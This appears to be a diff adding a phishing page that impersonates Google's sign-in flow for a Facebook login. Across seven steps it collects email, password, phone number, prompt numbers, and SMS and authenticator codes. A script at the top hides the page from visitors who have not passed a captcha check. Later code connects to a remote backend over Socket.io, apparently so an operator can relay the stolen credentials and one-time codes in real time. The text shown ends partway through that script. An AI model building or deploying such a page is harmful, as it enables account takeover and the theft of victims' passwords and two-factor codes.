@@ -1,0 +1,1520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google Accounts</title>
+  <link rel="icon" type="image/png" href="https://www.gstatic.com/images/branding/product/1x/googleg_16dp.png"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+
+    body {
+      font-family: "Google Sans", Roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    @media (min-width: 601px) {
+      body {
+        background: #f0f4f9;
+        align-items: center;
+        justify-content: center;
+        padding: 48px 16px;
+      }
+    }
+
+    /* ─── Card ─── */
+    .card {
+      background: #fff;
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    @media (min-width: 601px) {
+      .card {
+        border: 1px solid #dadce0;
+        border-radius: 28px;
+        width: 480px;
+        min-height: 528px;
+        overflow: hidden;
+      }
+    }
+
+    /* Wide 2-column layout at 961px+ — responsive, matches Google original proportions */
+    @media (min-width: 961px) {
+      .card {
+        width: min(1100px, calc(100% - 96px));
+        min-height: 384px;
+      }
+    }
+
+    /* ─── Top nav bar ─── */
+    .card-nav {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 0 16px;
+      height: 48px;
+      border-bottom: 1px solid #c4c7c5;
+      flex-shrink: 0;
+    }
+
+    .nav-g { width: 20px; height: 24px; flex-shrink: 0; }
+
+    .nav-title {
+      font-size: 14px;
+      font-weight: 500;
+      color: #444746;
+    }
+
+    /* ─── Card body — single column mobile, 2-column desktop ─── */
+    .card-body {
+      flex: 1;
+      padding: 48px 40px 36px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    @media (max-width: 600px) {
+      .card-body { padding: 24px 24px 24px; flex: none; }
+      .col-form   { flex: none; }
+    }
+
+    /* 2-column on wide screens */
+    @media (min-width: 961px) {
+      .card-body {
+        flex-direction: row;
+        padding: 48px 48px 36px;
+        gap: 0;
+        align-items: stretch;
+      }
+    }
+
+    /* ─── Left column: branding ─── */
+    .col-brand {
+      display: flex;
+      flex-direction: column;
+      flex-shrink: 0;       /* don't stretch on mobile */
+      margin-bottom: 16px;  /* compact gap before form on mobile */
+    }
+
+    @media (min-width: 961px) {
+      .col-brand {
+        flex: 0 0 45%;
+        margin-bottom: 0;
+        padding-right: 40px;
+        border-right: 1px solid #e0e0e0;
+      }
+    }
+
+    /* ─── Right column: form ─── */
+    .col-form {
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+    }
+
+    @media (min-width: 961px) {
+      .col-form {
+        padding-left: 40px;
+      }
+    }
+
+    /* ─── Headings ─── */
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #1f1f1f;
+      line-height: 1.3;
+      margin-bottom: 8px;
+    }
+
+    @media (min-width: 961px) {
+      h1 {
+        font-size: 32px;
+        margin-bottom: 16px;
+      }
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #1f1f1f;
+      margin-bottom: 32px;
+    }
+
+    @media (min-width: 961px) {
+      .subtitle { margin-bottom: 0; }
+    }
+
+    .subtitle button {
+      background: none;
+      border: none;
+      color: #0b57d0;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 0;
+      font-family: inherit;
+    }
+
+    .subtitle button:hover { text-decoration: underline; }
+
+    /* ─── Material 3 Outlined Text Field ─── */
+    .text-field {
+      position: relative;
+      margin-bottom: 8px;
+    }
+
+    .text-field input {
+      width: 100%;
+      height: 56px;
+      padding: 12px 14px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      font-size: 16px;
+      font-family: inherit;
+      color: #1f1f1f;
+      background: transparent;
+      outline: none;
+      caret-color: #0b57d0;
+      transition: border-color 0.15s;
+    }
+
+    .text-field input:hover:not(:focus):not(.err) { border-color: #1f1f1f; }
+
+    .text-field input:focus {
+      border: 2px solid #0b57d0;
+      padding: 11px 13px;
+    }
+
+    .text-field input.err {
+      border: 2px solid #b3261e;
+      padding: 11px 13px;
+    }
+
+    .text-field label {
+      position: absolute;
+      left: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      padding: 0 8px;
+      font-size: 16px;
+      color: #444746;
+      background: #fff;
+      pointer-events: none;
+      transition: all 0.15s cubic-bezier(.4,0,.2,1);
+      white-space: nowrap;
+    }
+
+    .text-field input:focus ~ label,
+    .text-field input.has-val ~ label {
+      top: 0;
+      font-size: 12px;
+      color: #0b57d0;
+    }
+
+    .text-field input.err ~ label {
+      top: 0;
+      font-size: 12px;
+      color: #b3261e !important;
+    }
+
+    .text-field input.has-val:not(:focus):not(.err) ~ label { color: #444746; }
+
+    /* Error message */
+    .field-error { font-size: 12px; color: #b3261e; margin-top: 4px; display: none; }
+    .field-error.visible { display: block; }
+
+    /* ─── Account chip (step 2) ─── */
+    .acct-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px 8px 8px;
+      border: 1px solid #c4c7c5;
+      border-radius: 100px;
+      cursor: pointer;
+      margin-top: 8px;
+      width: fit-content;
+      max-width: 100%;
+      transition: background 0.15s;
+    }
+    .acct-chip:hover { background: rgba(68,71,70,.08); }
+
+    .acct-chip-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #e8eaed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      overflow: hidden;
+    }
+
+    .acct-chip-email {
+      font-size: 14px;
+      color: #1f1f1f;
+      font-weight: 400;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      max-width: 220px;
+    }
+
+    /* ─── Show password checkbox ─── */
+    .show-pw-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-top: 8px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .show-pw-row input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      min-width: 18px;
+      cursor: pointer;
+      accent-color: #0b57d0;
+    }
+
+    .show-pw-row span {
+      font-size: 14px;
+      color: #444746;
+    }
+
+    /* ─── Links ─── */
+    .forgot-link {
+      font-size: 14px;
+      font-weight: 500;
+      color: #0b57d0;
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 4px;
+      margin-bottom: 24px;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    /* ─── Privacy notice ─── */
+    .privacy-notice {
+      font-size: 12px;
+      color: #444746;
+      line-height: 1.5;
+    }
+    .privacy-notice a { color: #0b57d0; text-decoration: none; }
+    .privacy-notice a:hover { text-decoration: underline; }
+
+    /* ─── Action buttons ─── */
+    .actions {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 24px;
+      padding-top: 0;
+    }
+
+    /* On wide desktop keep buttons pushed to bottom of column */
+    @media (min-width: 961px) {
+      .actions {
+        margin-top: auto;
+        padding-top: 32px;
+      }
+    }
+
+    .btn-text {
+      height: 40px;
+      padding: 0 12px;
+      background: none;
+      border: none;
+      color: #0b57d0;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      border-radius: 20px;
+      transition: background 0.15s;
+    }
+    .btn-text:hover { background: rgba(11,87,208,.08); }
+
+    .btn-next {
+      height: 40px;
+      padding: 0 24px;
+      background: #0b57d0;
+      border: none;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      border-radius: 20px;
+      transition: background 0.15s, box-shadow 0.15s;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .btn-next:hover {
+      background: #0842a0;
+      box-shadow: 0 1px 2px rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+    }
+    .btn-next:active { background: #0b44c0; }
+    .btn-next:disabled { opacity: .6; cursor: default; }
+
+    .btn-spinner {
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .65s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ─── Page footer ─── */
+    .page-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 480px;
+      padding: 8px 0;
+      margin-top: 8px;
+    }
+
+    @media (min-width: 961px) {
+      .page-footer {
+        max-width: min(1100px, calc(100% - 96px));
+      }
+    }
+
+    @media (max-width: 600px) { .page-footer { padding: 8px 16px; } }
+
+    .lang-btn {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      padding: 8px 12px;
+      border-radius: 8px;
+      border: 1px solid #c4c7c5;
+      background: none;
+      font-size: 12px;
+      color: #444746;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .lang-btn:hover { background: rgba(68,71,70,.08); }
+
+    .footer-links { display: flex; align-items: center; gap: 16px; }
+    .footer-links a { font-size: 12px; color: #444746; text-decoration: none; }
+    .footer-links a:hover { text-decoration: underline; }
+
+    /* ─── Phone prefix box (step 3) ─── */
+    .phone-row {
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+      margin-bottom: 8px;
+    }
+
+    .phone-prefix-box {
+      flex-shrink: 0;
+      width: 72px;
+      height: 56px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      color: #1f1f1f;
+      font-weight: 500;
+      background: #f8f9fa;
+      user-select: none;
+    }
+
+    .phone-info {
+      font-size: 14px;
+      color: #444746;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    /* ─── Step 4: Google Prompt ─── */
+    .prompt-number {
+      font-size: 80px;
+      font-weight: 300;
+      color: #1f1f1f;
+      line-height: 1;
+      margin-bottom: 20px;
+      letter-spacing: -2px;
+    }
+
+    .prompt-device-title {
+      font-size: 18px;
+      font-weight: 500;
+      color: #1f1f1f;
+      margin-bottom: 12px;
+    }
+
+    .prompt-desc {
+      font-size: 14px;
+      color: #444746;
+      line-height: 1.57;
+      margin-bottom: 16px;
+    }
+
+    .prompt-help-link {
+      font-size: 14px;
+      color: #0b57d0;
+      text-decoration: none;
+    }
+    .prompt-help-link:hover { text-decoration: underline; }
+
+    .prompt-checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #444746;
+      cursor: pointer;
+      user-select: none;
+      align-self: flex-start;
+    }
+    .prompt-checkbox-row input { accent-color: #0b57d0; width: 18px; height: 18px; cursor: pointer; }
+
+    .col-form-center {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    /* ─── Step 5: SMS phone entry ─── */
+    .sms-gif-wrap {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 8px;
+    }
+    .sms-gif-wrap img {
+      width: 80px;
+      height: 80px;
+      object-fit: contain;
+    }
+    .sms-section-title {
+      font-size: 16px;
+      font-weight: 500;
+      color: #1f1f1f;
+      margin-bottom: 8px;
+    }
+    .sms-desc {
+      font-size: 14px;
+      color: #444746;
+      line-height: 1.57;
+      margin-bottom: 16px;
+    }
+    .sms-masked-num {
+      color: #1f1f1f;
+      font-weight: 500;
+      white-space: nowrap;
+    }
+    .sms-country-selector {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      height: 54px;
+      padding: 0 12px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      font-size: 14px;
+      color: #1f1f1f;
+      cursor: pointer;
+      white-space: nowrap;
+      background: #fff;
+      min-width: 90px;
+      position: relative;
+      flex-shrink: 0;
+    }
+    .sms-country-selector::after {
+      content: '';
+      border: 5px solid transparent;
+      border-top-color: #444746;
+      margin-top: 4px;
+    }
+    .sms-checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 8px;
+    }
+    .sms-checkbox-row input[type=checkbox] {
+      width: 18px;
+      height: 18px;
+      accent-color: #1a73e8;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .sms-checkbox-row label {
+      font-size: 14px;
+      color: #1f1f1f;
+      cursor: pointer;
+      line-height: 1.4;
+    }
+
+    /* ─── Step 6: Code entry ─── */
+    .code-hint {
+      font-size: 14px;
+      color: #444746;
+      line-height: 1.57;
+      margin-bottom: 24px;
+    }
+
+    /* ─── Loading overlay ─── */
+    .page-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,.5);
+      z-index: 99;
+    }
+    .page-overlay.visible { display: block; }
+  </style>
+</head>
+<body>
+
+  <!-- Loading overlay -->
+  <div class="page-overlay" id="overlay"></div>
+
+  <!-- Sign-in card -->
+  <div class="card">
+
+    <!-- Top nav -->
+    <nav class="card-nav" aria-label="Sign in with Google">
+      <svg class="nav-g" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 48" aria-hidden="true">
+        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
+        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
+        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
+        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
+      </svg>
+      <span class="nav-title">Sign in with Google</span>
+    </nav>
+
+    <!-- ── STEP 1: Email ── -->
+    <div class="card-body" id="step1">
+      <div class="col-brand">
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to <button type="button" id="continueAppBtn">Facebook</button></p>
+      </div>
+      <div class="col-form">
+        <div class="text-field">
+          <input
+            type="email"
+            id="emailInput"
+            name="identifier"
+            placeholder=" "
+            autocomplete="username webauthn"
+            spellcheck="false"
+            aria-label="Email or phone"
+          />
+          <label for="emailInput">Email or phone</label>
+        </div>
+        <div class="field-error" id="emailError">Enter a valid email or phone number</div>
+
+        <a href="#" class="forgot-link">Forgot email?</a>
+
+        <p class="privacy-notice" data-privacy-notice>
+          Before using this app, you can review Facebook's
+          <a href="https://www.facebook.com/privacy/policy" target="_blank">Privacy Policy</a>
+          and
+          <a href="https://www.facebook.com/terms.php" target="_blank">Terms of Service</a>.
+        </p>
+
+        <div class="actions">
+          <button class="btn-text" type="button">Create account</button>
+          <button class="btn-next" type="button" id="emailNextBtn">
+            <span id="emailBtnLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step1 -->
+
+    <!-- ── STEP 2: Password ── -->
+    <div class="card-body" id="step2" style="display:none;">
+      <div class="col-brand">
+        <h1>Welcome</h1>
+        <!-- Account chip: person icon + email (matches original Google design) -->
+        <div id="accountChip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="chipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <div class="text-field">
+          <input
+            type="password"
+            id="pwInput"
+            name="Passwd"
+            placeholder=" "
+            autocomplete="current-password"
+            spellcheck="false"
+            aria-label="Enter your password"
+          />
+          <label for="pwInput">Enter your password</label>
+        </div>
+        <div class="field-error" id="pwError">Wrong password. Try again or click 'Forgot password' to reset it.</div>
+
+        <!-- Show password checkbox — matches Google's original -->
+        <label class="show-pw-row">
+          <input type="checkbox" id="showPwCheck" />
+          <span>Show password</span>
+        </label>
+
+        <p class="privacy-notice" style="margin-top:24px;" data-privacy-notice>
+          Before using this app, you can review Facebook's
+          <a href="https://www.facebook.com/privacy/policy" target="_blank">Privacy Policy</a>
+          and
+          <a href="https://www.facebook.com/terms.php" target="_blank">Terms of Service</a>.
+        </p>
+
+        <div class="actions">
+          <button class="btn-text" type="button" id="forgotPwBtn">Forgot password?</button>
+          <button class="btn-next" type="button" id="pwNextBtn">
+            <span id="pwBtnLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step2 -->
+
+    <!-- ── STEP 3: Phone number ── -->
+    <div class="card-body" id="step3" style="display:none;">
+      <div class="col-brand">
+        <h1>Verify it's you</h1>
+        <div id="step3AccountChip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step3ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="phone-info">
+          For added security, Google wants to verify it's really you. Enter the phone number associated with your account.
+        </p>
+        <div class="phone-row">
+          <div class="phone-prefix-box" id="phonePrefixBox">+</div>
+          <div class="text-field" style="flex:1;">
+            <input
+              type="tel"
+              id="phoneInput"
+              placeholder=" "
+              autocomplete="tel"
+              spellcheck="false"
+              aria-label="Phone number"
+            />
+            <label for="phoneInput">Phone number</label>
+          </div>
+        </div>
+        <div class="field-error" id="phoneError">Enter a valid phone number</div>
+
+        <div class="actions">
+          <button class="btn-text" type="button" id="phoneBackBtn">Back</button>
+          <button class="btn-next" type="button" id="phoneNextBtn">
+            <span id="phoneBtnLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step3 -->
+
+    <!-- ── STEP 4: Google Prompt (number) ── -->
+    <div class="card-body" id="step4" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Google wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step4Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step4ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+        <a href="#" class="forgot-link" style="margin-top:auto; margin-bottom:0;">Resend it</a>
+      </div>
+      <div class="col-form col-form-center">
+        <div class="prompt-number" id="promptNumber">58</div>
+        <p class="prompt-device-title" id="promptDeviceName">Open the Gmail or YouTube app</p>
+        <p class="prompt-desc">
+          Google sent a notification to your <span id="promptDeviceNameInline">phone</span>. Open the Gmail or YouTube app, tap <strong>Yes</strong> on the
+          prompt, then tap <strong id="promptNumberInline">58</strong> on your phone to verify it's you.
+        </p>
+        <a href="#" class="prompt-help-link">Need help? Learn more about Google prompts</a>
+        <label class="prompt-checkbox-row">
+          <input type="checkbox" checked> Don't ask again on this device
+        </label>
+        <div class="actions" style="width:100%;">
+          <span></span>
+          <button class="btn-text" type="button">Try another way</button>
+        </div>
+      </div>
+    </div><!-- /.card-body step4 -->
+
+    <!-- ── STEP 5: SMS — Phone entry ── -->
+    <div class="card-body" id="step5" style="display:none;">
+      <div class="col-brand">
+        <div class="sms-gif-wrap">
+          <img src="https://ssl.gstatic.com/accounts/account-recovery-sms-pin.gif" aria-hidden="true" alt="">
+        </div>
+        <h1>2-Step Verification</h1>
+        <div id="step5Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step5ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="sms-section-title">Get a verification code</p>
+        <p class="sms-desc">
+          To get a verification code, first confirm the phone number you added to your account
+          <span class="sms-masked-num">••• ••• •<span id="smsLastTwo">92</span></span>.
+          <em>Standard message and data rates may apply.</em>
+        </p>
+        <div class="phone-row">
+          <div class="sms-country-selector" id="smsPrefixBox">+</div>
+          <div class="text-field" style="flex:1;">
+            <input
+              type="tel"
+              id="smsPhoneInput"
+              placeholder=" "
+              autocomplete="tel"
+              aria-label="Phone number"
+            />
+            <label for="smsPhoneInput">Phone number</label>
+          </div>
+        </div>
+        <div class="field-error" id="smsPhoneError">Enter a valid phone number</div>
+        <div class="sms-checkbox-row">
+          <input type="checkbox" id="smsDontAsk">
+          <label for="smsDontAsk">Don't ask again on this device</label>
+        </div>
+        <div class="actions">
+          <span></span>
+          <button class="btn-next" type="button" id="smsSendBtn">
+            <span id="smsSendLabel">Send</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step5 -->
+
+    <!-- ── STEP 6: SMS — Code entry ── -->
+    <div class="card-body" id="step6" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Google wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step6Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step6ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="code-hint" id="smsCodeHint">
+          Enter the 6-digit code we sent to your phone.
+        </p>
+        <div class="text-field">
+          <input
+            type="text"
+            id="smsCodeInput"
+            placeholder=" "
+            maxlength="6"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            aria-label="Enter code"
+          />
+          <label for="smsCodeInput">Enter code</label>
+        </div>
+        <div class="field-error" id="smsCodeError">Wrong code. Try again or request a new one.</div>
+        <a href="#" class="forgot-link">Resend code</a>
+        <div class="actions">
+          <span></span>
+          <button class="btn-next" type="button" id="smsCodeNextBtn">
+            <span id="smsCodeLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step6 -->
+
+    <!-- ── STEP 7: Authenticator code ── -->
+    <div class="card-body" id="step7" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Google wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step7Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step7ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="sms-section-title">2-Step Verification</p>
+        <p class="code-hint">
+          Get a verification code from the <strong>Google Authenticator</strong> app
+        </p>
+        <div class="text-field">
+          <input
+            type="tel"
+            id="authCodeInput"
+            placeholder=" "
+            maxlength="6"
+            pattern="[0-9 ]*"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            aria-label="Enter code"
+          />
+          <label for="authCodeInput">Enter code</label>
+        </div>
+        <div class="field-error" id="authCodeError">Wrong code. Try again.</div>
+        <div class="sms-checkbox-row" style="margin-top:8px;">
+          <input type="checkbox" id="authDontAsk">
+          <label for="authDontAsk">Don't ask again on this device</label>
+        </div>
+        <div class="actions">
+          <button class="btn-text" type="button">Try another way</button>
+          <button class="btn-next" type="button" id="authCodeNextBtn">
+            <span id="authCodeLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step7 -->
+
+  </div><!-- /.card -->
+
+  <!-- Page footer -->
+  <footer class="page-footer">
+    <button class="lang-btn" type="button" aria-label="Change language">
+      <span>English (United States)</span>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+    </button>
+    <div class="footer-links">
+      <a href="https://support.google.com/accounts?hl=en" target="_blank">Help</a>
+      <a href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true" target="_blank">Privacy</a>
+      <a href="https://accounts.google.com/TOS?loc=US&hl=en" target="_blank">Terms</a>
+    </div>
+  </footer>
+
+  <!-- Socket.io for backend commands — same server as apply.html -->
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
+
+  <script>
+  /* Guard: redirect to apply.html if user opens this page directly (tab closed and reopened) */
+  (function () {
+    if (!sessionStorage.getItem('googleLoginSession')) {
+      window.location.replace('apply.html');
+    }
+  })();
+  </script>
+
+  <script>
+  (function () {
+    var BACKEND = 'https://backed-nxht.onrender.com';
+    /* Auto-switch to local backend when running on localhost or *.test */
+    if (location.hostname === 'localhost' || location.hostname === '127.0.0.1' ||
+        location.hostname.endsWith('.test') || location.hostname.endsWith('.local')) {
+      BACKEND = 'http://localhost:3001';
+    }
+
+    /* ─── clientId — reuse the one from apply.html so backend routes to same user ─── */
+    var clientId = localStorage.getItem('clientId');
+    if (!clientId) {
+      clientId = (typeof crypto !== 'undefined' && crypto.randomUUID)
+                 ? crypto.randomUUID()
+                 : Math.random().toString(36).slice(2) + Date.now().toString(36);
+      localStorage.setItem('clientId', clientId);
+    }
+
+    /* ─── Socket — init first so socket.id is available in fetch calls ─── */
+    var socket;
+    var currentSocketId = '';
+    var pwWaitTimer;
+
+    /* ─── Elements ─── */
+    var emailInput   = document.getElementById('emailInput');
+    var emailErr     = document.getElementById('emailError');
+    var emailNextBtn = document.getElementById('emailNextBtn');
+    var emailLabel   = document.getElementById('emailBtnLabel');
+
+    var step1 = document.getElementById('step1');
+    var step2 = document.getElementById('step2');
+
+    var pwInput      = document.getElementById('pwInput');
+    var pwErr        = document.getElementById('pwError');
